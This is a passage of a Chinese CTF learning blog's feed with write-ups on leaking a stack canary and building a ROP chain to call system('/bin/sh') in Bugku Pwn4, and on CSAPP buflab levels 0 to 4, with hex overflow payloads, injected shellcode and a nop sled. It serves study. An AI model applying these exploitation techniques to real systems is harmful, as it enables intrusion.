class="line">system=libc_base+system_offset</span><br></pre></td></tr></table></figure><p>因为所有函数偏移都已知，所以得到一个函数的地址即得到所有函数的地址。一般我们可以通过输出函数来泄露这个函数的地址，泄露成功就能<code>getshell</code></p><p>(PS:学是五天前学的，到现在还是没学会qwq)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>canary保护学习报告:通过字符串泄露canary</title>
      <link href="/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/"/>
      <url>/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<p>这几天一直在跟着团队的进度做<code>csapp</code>的实验报告，突然想拿题来练手了才发现自己还是有点菜的。这次的任务是做一道简简单单的带<code>canary</code>保护的一题，做了很长时间问了很多师傅，也算把这个方法搞搞明白了，但是不确定能不能完全说的明白，那么下面就开始吧。</p><span id="more"></span><h1 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h1><p><code>canary</code>就是一段简简单单的cookie，它一般在上个函数所保存的<code>ebp</code>之前(即靠近栈顶的那个方向)下面一个图能描述一个带<code>canary</code>保护的栈帧，应该还是比较清楚的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">↑栈顶</span><br><span class="line">buf//函数的缓冲区，一般用于保存局部变量</span><br><span class="line">canary</span><br><span class="line">ebp//上一个函数保存的ebp</span><br><span class="line">eip//返回地址</span><br><span class="line">argument 1</span><br><span class="line">argument 2</span><br><span class="line">argument 3</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">↓栈底</span><br></pre></td></tr></table></figure><p>如果企图用大量数据覆盖缓冲区并且修改返回地址的数据达到劫持<code>eip</code>的目的那么就会修改<code>canary</code>的值，那么在返回的时候检测到<code>canary</code>的值发生改变后就会直接抛出异常并且停止执行程序。并且每次<code>canary</code>的值都是随机的，普通方法几乎是突破不了的。但是我们可以先想办法泄露<code>canary</code>的值，然后再把<code>canary</code>插入到<code>payload</code>当中，这样的话，就算我溢出了，但是并没有修改<code>canary</code>的值，也就没办法检测到我有没有栈溢出了。在64位的程序当中，<code>canary</code>就是一个七字节的数据带一个<code>\x00</code>字节，并且<code>\x00</code>字节在最低位。</p><p>那么回想一下字符串是什么？字符串就是一串连着的字节序，不管它原本在这个地方的定义是什么，我说它是字符串，他就可以是字符串，因为计算机它不管是存什么数据它终归也只是0和1的组成。例如<code>0x61626364</code>它看上去好像是一个<code>int</code>型变量，但是它储存也只是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64 63 62 61</span><br></pre></td></tr></table></figure><p>如果我把它看成字符串那也没错，它可以代表字符串<code>dcba</code>，它们存储的数据是一模一样的。但是有一个问题：计算机里基本上都是又很多字节连在一起，那如果后面还有很多数据，怎么样才能只表示字符串<code>dcba</code>呢？那就需要一个特殊字节<code>\x00</code>了，识别字符串会从一个字符指针开始，然后依次增大指针的值，只要指针所指向的地址不是<code>\x00</code>字节，那么它就可以是这个字符串中的一员。那如果我输入一个字符串，溢出了但没完全溢出呢？我们把字符串填充地恰到好处，刚好紧挨着<code>canary</code>，那么在之后如果<code>printf</code>这个字符串的话，就会把<code>canary</code>一起输出出来，我们就获取了<code>canary</code>。但是注意，canary最后一个字节是<code>\x00</code>，不会被接受，因此在获取canary的时候注意末尾加上<code>\x00</code>字节。</p><p>下面来看道例题：</p><h2 id="Bugku-Pwn4"><a href="#Bugku-Pwn4" class="headerlink" title="Bugku - Pwn4"></a>Bugku - Pwn4</h2><p>下载文件照例拖进虚拟机<code>checksec</code>检查一下各种保护</p><p><img src="https://i.loli.net/2021/05/01/XSkKpCyAZN1uslE.png" alt="Bugku_pwn4_1.png"></p><p>发现只开启了<code>canary</code>和堆栈不可执行的保护，堆栈不可执行那么就不能注入代码，一般就直接<code>rop</code>攻击，这没什么好讲的。拖进<code>IDA-F5</code>主函数看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">520</span>]; <span class="comment">// [rsp+40h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+248h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome!\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave your name(Within 36 Length):&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buf);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave a message(Within 0x200 Length):&quot;</span>, <span class="number">0x2C</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, v5, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your message is :%s \nBye~&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里执行了两次<code>read()</code>函数，并且读取的大小远远超过缓冲区开辟的大小，基本上可以说无限制吧。然后第一次<code>read</code>之后还有一次<code>printf()</code>输出，那很明显，第一次就让你泄露canary，第二次就去执行<code>shell</code>函数，如果不确定缓冲区的大小，那么可以双击buf变量看看和离本函数<code>rbp</code>的相对偏移。</p><p><img src="https://i.loli.net/2021/05/01/uPz4Uq21LEdsOvF.png" alt="Bugku_pwn4_2.png"></p><p>可以看到相对<code>rbp</code>的偏移为<code>-0x240</code>而且<code>canary</code>在<code>rbp-8</code>的位置，那么我们第一次的<code>payload</code>就很容易得知是<code>b&#39;a&#39;*(0x240-8-1)</code>了。然后用<code>recv</code>函数接受它输出的字符串，那么我们知道前面的<code>Hello</code>+<code>sapce</code>以及我们输入的<code>0x237</code>个<code>a</code>一共有<code>0x23e</code>个字节，这些都是垃圾数据，在接收完这些数据之后我们再往后接收七个字节，这些数据就是<code>canary</code>。那么分析到这里我们的<code>exp</code>就很好写了</p><p><img src="https://i.loli.net/2021/05/01/lb8YdQVfKAI32oh.png" alt="Bugku_pwn4_3.png"></p><p>在这里<code>p.sendline</code>对应<code>b&#39;a&#39;*0x237</code>然后你可以直接<code>p.recvline()</code>直接接收完垃圾数据或者是<code>p.recv(0x23e)</code>指定接收数据的长度的，因为<code>p.sendline()</code>会在指定的字符串之后添加一个<code>\n</code>字节，所以你前面只能有<code>0x237</code> 个填充的字节，然后此时<code>p.recvline()</code>在接收到<code>\n</code>字节后停止，这个和之前讲的字符串的判定类似。但是如果直接<code>p.send()</code>的话就可以填充满，并且你只能用第一个方法接收垃圾数据。那这样的话canary就成功被我们泄露并且保存了，接下来就是构造<code>shell</code>函数了。我们<code>shift+F12</code>查看字符串，一般<code>pwn</code>题的突破口都在这里，甚至逆向题也是如此。</p><p><img src="https://i.loli.net/2021/05/01/vyebYQpIdxDh3nl.png" alt="Bugku_pwn4_4.png"></p><p>查到<code>bin/sh(0x601068)</code>字符串，并且<code>system</code>函数直接在表里可以查到<code>0x400660</code>，但是<del>往后面调用了system函数以及堆了那个参数之后才</del>注意到这是64位程序，所以我们很轻(jian)松(nan)地可以得知这题肯定要用<code>rop</code>去传参给<code>rdi</code>寄存器了，32位和64位的传参差异我就不过多赘述了，前面博客很多次提到过了。那么这个时候我们先写出要执行的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq $0x601068,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>但是一般来说，带一个那么多位立即数的且指令一模一样的是不可能直接让你找到的。此时肯定不能莽撞，只可智取，我们因为栈上的数据我们可以随意写(只是不能写代码，写了也不能执行啊)，那么我们重新看一看栈的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">canary</span><br><span class="line">rbp</span><br><span class="line">rip</span><br></pre></td></tr></table></figure><p>我们如果在rip位置放一个<code>pop %rdi</code>的话，那么<code>rip</code>下方的数据就能直接被传出来，然后后面再放上<code>system</code>函数就完成了整个提权函数的构造了，那么我们的<code>payload</code>就直接是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+canary+fake_rbp+pop_rdi+bin_sh_addr+system_addr</span><br></pre></td></tr></table></figure><p>找rop碎片的方法在前面的attacklab中有提到很多的，大家可以翻翻我前面的博客，所以我们完整的exp就可以出炉了：</p><p><img src="https://i.loli.net/2021/05/01/uWeGAhXz3JHSqKM.png" alt="Bugku_pwn4_5.png"></p><p>今天真的学到了很多知识，非常的开心，但是对于初入ctf的小白我来说，还有很长的路要走。加油！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bufblab实验报告:32位程序缓冲区溢出攻击</title>
      <link href="/2021/04/30/buflab/"/>
      <url>/2021/04/30/buflab/</url>
      
        <content type="html"><![CDATA[<p>在此实验开始之前，弄清楚给你的三个文件分别干嘛的。</p><p><code>bufbomb</code>：实验需要攻击的程序</p><p><code>hex2raw</code>：根据填写的字节生成攻击字符串</p><p><code>makecookie</code>：对每个实验用户生成一个八位十六进制的字节序列，用于识别用户。(可能是用来打分的)</p><p>在<code>gdb</code>要运行的时候，一定要输入<code>r -u &lt;your id&gt;</code>，终端运行要输入<code>./bufbomb -u &lt;your id&gt;</code>，否则你是运行不了的。那咱们先输入<code>./makecookie -q</code>生成你的<code>cookie（id）</code>,最好先找个地儿保存一下。</p><span id="more"></span><p>作者在这里赞美一下这本书的编者：<code>csapp</code>的所有实验设计简直不要太好，学习计算机系统本是一个很枯燥的学习过程，但是这里的实验最大程度激发学生学习的兴趣。同时也希望国内的编者能够借鉴这本书的巧妙之处，让国内出越来越多的优秀教材。（由于本人表达能力不够，也只能这么夸了qwq）</p><h2 id="level0-Candle"><a href="#level0-Candle" class="headerlink" title="level0:Candle"></a>level0:Candle</h2><p>这一堆英文我反正也看不来<code>qwq</code>，既然是<code>level0</code>不妨问题想简单一点：给了我<code>test()</code>函数，调用了一个<code>getbuf()</code>，而后又有一个<code>gets()</code>危险函数，又给了一个<code>Smoke()</code>函数，那么无疑，应该就是通过溢出调用<code>Somke()</code>，先反正不涉及代码注入等东西<code>gdb</code>就是万能的，我们普通地这么溢出只需要确定两点：</p><ol><li>缓冲区的大小</li><li><code>Smoke()</code>函数的地址</li></ol><p>先<code>gdb bufbomb</code>然后：</p><p><code>print Smoke</code>就可以输出函数的地址，<code>disassemble getbuf</code>就可以查看<code>getbuf()</code>的汇编代码</p><p><img src="https://i.loli.net/2021/04/26/WNAayP3TSYiGJ5Z.png" alt="buflab_level0_1.png"></p><p>可以看到，<code>buf</code>的大小是<code>0x28</code>，那么就构造<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/EP5SQWcfa23hDi7.png" alt="buflab_level0_2.png"></p><p>但是发生了段错误，这里我调了很久，也可能是因为之前做64位的攻击，有点忘了32位的攻击的区别，因为真的之前就是它缓冲区开了多少我填那么多再堆返回地址就好了的。直到我看到<code>getbuf()</code>函数有一个<code>leave</code>指令，我这就去网上搜了一下<code>leave</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Leave==</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>啊这？又被弹出来了原来的<code>ebp</code>?可能在你们眼里这个完全是个没必要犯得错误，但是我遇到了我就得这么讲出来，也算是一种提升吧。那就很清楚了，我们把函数返回地址弹出去了，就导致给<code>eip</code>的不知道是什么地址了。所以再加四字节的<code>00</code>，就会把<code>00 00 00 00</code>弹给<code>ebp</code>而把<code>smoke()</code> 函数的返回地址弹给<code>eip</code>了。所以正确的<code>payload</code>应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">18 8c 04 08</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/tswP6XaDFAEB94S.png" alt="buflab_level0_3.png"></p><p>可以看到，这就攻击成功了，我是没想到啊，最简单的攻击就败下阵来，一次失败然后成功得到的经验比多次成功得到的经验是多很多的，所以嘛，这波不亏。</p><h2 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1:Sparkler"></a>level1:Sparkler</h2><p>这次要求我们执行的<code>shell</code>函数是<code>fizz(int val)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val); </span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这回加了个参数判断，32位的程序，甚至不需要代码注入，参数直接往返回地址后面填就好了。地址怎么找我也就不赘述了，加参数的话，如果多位参数记得一定是从右往左入栈的，即：第一个参数在离栈顶最近，第二个就是网站底走四个字节，第三个……以此类推。但是一定注意栈帧的构成，它在调用函数的时候压完参数还要压<code>eip</code>，虽然我们不一定要它返回到什么地方，但是它有，所以我们在原来的基础上填充四个字节的假的返回地址再把参数加进去</p><p>payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">42 8c 04 08//fizz address</span><br><span class="line">00 00 00 00//fake returning address</span><br><span class="line">8a 5f 63 5e//your cookie</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/28/kjfapgYERzZxwvG.png" alt="buflab_level1_1.png"></p><p>那这个<code>level1</code>就也解决了，个人认为这个<code>buflab</code>应该放在<code>attacklab</code>前面的，64位参数不好直接传，但是32位就硬传，但是它这么设计必有什么我目前不知道的巧妙之处。</p><h2 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2:Firecracker"></a>level2:Firecracker</h2><p>这一次要求我们执行的<code>shell</code>函数是<code>bang()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);     </span><br><span class="line">        validate(<span class="number">2</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很清楚的看出来，程序定义了一个全局变量，执行这个函数的时候要求这个变量==<code>your cookie</code>我们都很清楚，全局变量不同于局部变量，局部变量是存在栈中的，全局变量存在<code>.bss</code>段或者是<code>.data</code>段的，因此我们要修改不可能只是简单的栈溢出，我们需要注入代码。在栈中注入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl value of cookie,address of global_value</span><br><span class="line">pushl (address of bang)</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>因为栈可以执行代码，没必要去搜集<code>rop</code>碎片，直接注入这一串代码就行了。<code>bang()</code>函数的地址和<code>cookie</code>我们是很容易获取的，唯一就是这全局变量的地址我们没办法直接获取。我们可以选择<code>disassemble bang</code>反汇编这个函数看看具体的结构。</p><p><img src="https://i.loli.net/2021/04/29/vOFoK3wcjGVesHZ.png" alt="buflab_level2_1.png"></p><p>可以发现中间<code>cmp</code>指令比较一定就是那个<code>if</code>语句的实现，比较的东西肯定也是<code>cookie</code>和那个<code>global_value</code>，并且也很清楚的可以看到，它比较的内容都是<code>ds</code>段寄存器的 内容。至于这两个地址哪一个还需要进一步分析，因为我们可以很清楚的知道，在运行的时候我们的<code>cookie</code>就是已经确定的，而另一个则应该一直是0，所以我们可以先<code>b getbuf</code>然后<code>r- u xiaoji233</code>，运行在中间停住的时候<code>print *0x804d100</code>看看这个地址到底是什么。</p><p><img src="https://i.loli.net/2021/04/29/ZFRstrT8QAubCkJ.png" alt="buflab_level2_2.png"></p><p>其实结果就很明显了，<code>0x804d100</code>就是全局变量的地址，另一个你把它转换成十六进制就是你的<code>cookie</code>，确定完这三个内容以后重写一下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,0x804d100//在AT&amp;T汇编中，立即数一定要加$，不加代表是地址。</span><br><span class="line">push 0x8048c9d//此时不用考虑端序</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里略微再提一下查看汇编代码机器码的方法，具体操作可以看我上一篇博文。。</p><p><img src="https://i.loli.net/2021/04/29/ds1iuEKNWXGUJ3P.png" alt="buflab_level2_3.png"></p><p>还有一点需要确定的就是缓冲区字符的首地址了，因为返回地址要填这个才能把<code>eip</code>劫持到栈上执行,那么我现在获取的地址是<code>0x55683868</code>，这个每个人id不同貌似会有不太一样的。那么方法就是先确定ebp然后看看字符串开始的位置相对于ebp的偏移，就能轻松算出来了。还有一个比较一般的方法应该适合大部分人，先<code>b getbuf</code>然后运行到gets函数之后观看栈的情况。如下图：</p><p><img src="https://i.loli.net/2021/04/29/A8cIFe3BvY7PSyT.png" alt="buflab_level2_4.png"></p><p>就可以很轻松地确定了，当你不确定自己填的返回地址是不对的情况下，这个方法百分百没错，那么我们的payload就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c7 04 25 00 </span><br><span class="line">d1 04 08 8a </span><br><span class="line">5f 63 5e 68 </span><br><span class="line">9d 8c 04 08 </span><br><span class="line">c3 00 00 00 //inject code</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">68 38 68 55//address of String&#x27;s top</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/29/D8Gm2SjunFXxQtd.png" alt="buflab_level2_5.png"></p><h2 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3:Dynamite"></a>level3:Dynamite</h2><p>这一关咱们需要再不破坏原有栈帧的情况下将返回值修改成我们自己的<code>cookie</code>，这十分符合一个黑客的作为，咱们身为黑客就该神不知鬼不觉的去拿到<code>shell</code>，不然容易被打awa，打<code>ctf-pwn</code>题的我们基本都是能获取<code>shell</code>什么事都干得出来。破坏了原本结构？关我啥事，我拿到了<code>shell</code>就够了。</p><p>言归正传，在这里其实<code>gdb</code>就特别好用，因为我能知道它函数返回地址在哪，我只需要查一下调用这个函数的主函数，看看调用函数前存了些什么东西进去就可以很清楚的知道了。但是呢，我们一定还是要先溢出，不然都没办法劫持<code>eip</code>了，至于破坏的内容可以在代码注入里面去修复。就可以写出我们要注入的代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl your cookie,%eax</span><br><span class="line">movl original ebp address,%ebp</span><br><span class="line">push original eip</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>那么我们只需要找到原来的<code>ebp</code>和<code>eip</code>就可以实现攻击了,那我们就先给<code>getbuf()</code>的第一句下个断点看看此时<code>ebp</code>的值，<code>getbuf</code>的反汇编结果见上面的图。<code>b *0x80491f4</code>断住查看 <code>esp</code>的值。</p><p><img src="https://i.loli.net/2021/04/29/gx6R1cHPh3iQuMA.png" alt="buflab_level3_1.png"></p><p>可以很清楚地看到esp</p><p>至于<code>epi</code>，可以返回汇编它的父函数，可以看到<code>call</code>完<code>getbuf()</code>的下一条指令地址，这个应该就是之前保存的返回地址了。</p><p><img src="https://i.loli.net/2021/04/29/VWAo9rX3JPUuhqT.png" alt="buflab_level3_2.png"></p><p>这里讲一下函数调用的机制，先是传参数，32位的程序是从左到右依次入栈，64位的程序则是前六个参数分别进入<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，参数多于六个再从右往左依次入栈。接下来保存调用该函数语句下一句的指令地址存在栈上，这个就是所谓的返回地址了。至于接下来的事，那就是在函数里面了，分别有保存父函数的栈帧情况，计算完成后返回值保存在<code>eax</code>寄存器之后先恢复父函数的栈帧情况(弹出<code>ebp</code>，<code>esp</code>+对应的值)，弹出<code>eip</code>。</p><p>那么注入的代码就很清楚了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,%eax</span><br><span class="line">movl $0x556838c0,%ebp</span><br><span class="line">push $0x08048dbe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>运行一遍看看，完美！！！</p><p><img src="https://i.loli.net/2021/04/29/VH8wgMDON5KPln4.png" alt="buflab_level3_3.png"></p><h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>这一关，这一关你需要使用<code>./bufbomb -n</code>去执行，加了参数之后就不会执行<code>test()</code>函数了，而是<code>testn()</code>函数，调用<code>getbufn()</code>函数并且使它返回你的<code>cookie</code>，乍一听跟<code>level3</code>咋一模一样，但是自己调试一遍就会发现它要求你输入五次，并且每次的栈帧都不一样，我测试了一遍，每一次的字符串起始位置值是分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55683688</span><br><span class="line">0x55683658</span><br><span class="line">0x55683668</span><br><span class="line">0x55683628</span><br><span class="line">0x55683688</span><br></pre></td></tr></table></figure><p>那么我们注入的代码就不能直接<code>mov $xxxx,%ebp</code>了，得靠点其它东西，想想函数调用的过程，是有一个过程叫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push %ebp</span><br><span class="line">mov %esp,%ebp</span><br><span class="line">sub $xxx,%ebp</span><br><span class="line">//调用过程</span><br><span class="line">add $xxx,%ebp</span><br><span class="line">pop %ebp</span><br></pre></td></tr></table></figure><p>我们发现调用的过程中，只有栈是被我们破坏了，寄存器是完好无损的，但是<code>ebp</code>寄存器有一个取栈上数据的操作，但是<code>esp</code>寄存器至始至终是完好的呀。因此我们只要让<code>ebp</code>为<code>esp+0x28</code>(因为<code>testn()</code>在调用前申请了<code>0x24</code>的空间，再加上保存的<code>ebp</code>就是<code>0x28</code>)就行了，但是注意取的是地址，用<code>lea</code>指令，然后就是<code>eip</code>了，这没什么好说的，看看调用这个函数的下一句是什么就行了。但是注意，我们返回的地址也是要有讲究的，因为每一次都不一样，我们得靠<code>nop</code>指令。计算机执行<code>nop</code>指令除了内部一个计数器+1以外不会有任何操作，并且只占用一个字节<code>90</code>，而且刚刚好<code>getbuf()</code>函数它开的很大，给了我们充足的滑行距离。注入的代码我们尽量靠近栈底，然后返回的地址尽量选取最小的(0x55683860)，以便于覆盖所有的情况。那我们注入的代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5e635f8a,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x08048e3a</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>然后确定一下字节大小</p><p><img src="https://i.loli.net/2021/04/29/PGniK5S9eMjBR2U.png" alt="buflab_level4_1.png"></p><p>字符是从<code>0x208</code>的内存开始的，再加上<code>ebp</code>那就是<code>0x20c</code>的大小了，不同的是：那些我们都填充<code>90</code>就行了，<code>payload</code>就是</p><p><img src="https://i.loli.net/2021/04/29/dI7VyMspTgkN1Pa.png" alt="buflab_level4_2.png"></p><p>填充代码+代码长度为<code>0x20c</code>就好了。</p><p>然后，我就默默地调了两个小时的代码，去查了<code>wp</code>才发现，32位汇编和64位汇编的lea指令是不一样的，原来我就没注意这点<code>qwq</code>默默地枯了！！</p><p><img src="https://i.loli.net/2021/04/29/auI7AecP4CnKrUv.png" alt="buflab_level4_3.png"></p><p>然后就又是漫长的调试过程，我一直以为输入<code>r -u xiaoji233 -n 